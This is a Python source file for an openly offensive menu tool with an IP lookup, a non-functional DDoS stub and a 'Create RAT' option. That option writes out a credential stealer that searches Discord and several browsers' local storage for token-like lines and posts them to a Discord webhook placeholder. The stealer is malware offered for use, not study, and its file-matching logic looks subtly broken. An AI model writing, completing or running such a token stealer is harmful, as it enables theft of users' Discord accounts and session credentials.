import subprocess
import requests
import os
import shutil

def install_nmap():
    print("Installing nmap...")
    os.system('choco install -y nmap')

def ip_lookup():
    ip = input("Enter IP address: ")
    response = requests.get(f'http://ip-api.com/json/{ip}')
    data = response.json()
    print(data)
    return data

def ddos_tool(target, port):
    packets = int(input("Enter number of packets to send: "))
    print("DDoS functionality is not supported on Windows. Please use a Linux or macOS system for DDoS attacks.")

def create_rat():
    script = '''
import os
import requests

def steal_discord_token():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = [
        os.path.join(roaming, "Discord"),
        os.path.join(roaming, "discordcanary"),
        os.path.join(roaming, "discordptb"),
        os.path.join(local, "Google", "Chrome", "User Data", "Default"),
        os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data", "Default"),
        os.path.join(local, "Yandex", "YandexBrowser", "User Data", "Default")
    ]

    tokens = []
    for path in paths:
        if os.path.exists(path):
            for root, _, files in os.walk(path):
                for file in files:
                    if file == 'Local Storage\\leveldb':
                        for filename in os.listdir(os.path.join(root, file)):
                            if filename.endswith('.log') or filename.endswith('.ldb'):
                                with open(os.path.join(root, file, filename), 'r', errors='ignore') as f:
                                    for line in f:
                                        if 'oken' in line:
                                            tokens.extend(line.split())

    if tokens:
        send_to_webhook(tokens)

def send_to_webhook(tokens):
    webhook_url = "YOUR_WEBHOOK_URL"
    data = {"content": "\n".join(tokens)}
    requests.post(webhook_url, json=data)

def main():
    steal_discord_token()

if __name__ == "__main__":
    main()
    '''
    
    with open("rat.py", "w") as file:
        file.write(script)
    
    print("RAT script created: rat.py")

def print_help():
    print("Help Section:")
    print("1. IP Lookup: Enter an IP address to get detailed information about it.")
    print("2. DDoS Tool: Enter a target IP address and port, then specify the number of packets to send (not supported on Windows).")
    print("3. Create RAT: Generates a RAT script to steal Discord tokens.")
    print("0. Exit: Exit the program.")

def main():
    if not shutil.which("nmap"):
        install_nmap()

    while True:
        print("1. IP Lookup")
        print("2. DDoS Tool")
        print("3. Create RAT")
        print("4. Help")
        print("0. Exit")
        choice = input("Select an option: ")

        if choice == '1':
            ip_lookup()
        elif choice == '2':
            target = input("Enter target IP address: ")
            port = int(input("Enter target port: "))
            ddos_tool(target, port)
        elif choice == '3':
            create_rat()
        elif choice == '4':
            print_help()
        elif choice == '0':
            break
        else:
            print("Invalid option. Please try again.")

if __name__ == "__main__":
    main()
